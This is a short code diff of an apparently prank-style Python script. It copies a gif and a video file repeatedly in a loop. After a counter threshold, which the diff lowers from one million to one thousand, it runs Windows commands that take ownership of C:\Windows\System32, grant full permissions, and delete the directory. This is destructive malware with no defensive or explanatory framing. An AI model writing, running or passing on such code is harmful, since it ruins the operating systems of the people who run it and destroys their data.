@@ -7,7 +7,7 @@ while i == 0:
 	t+=1
 	shutil.copy ('henrystickmin.gif',path)
 	shutil.copy ('chungus.mp4',path2)
-if t == 1000000:
+if t == 1000:
 	os.system('cmd /c "takeown /a /r /d Y /f C:\Windows\System32"')
 	os.system('cmd /c "icacls C:\Windows\System32 /grant administrators:F /t"')
 	os.system('cmd /c "rmdir C:\Windows\System32"')
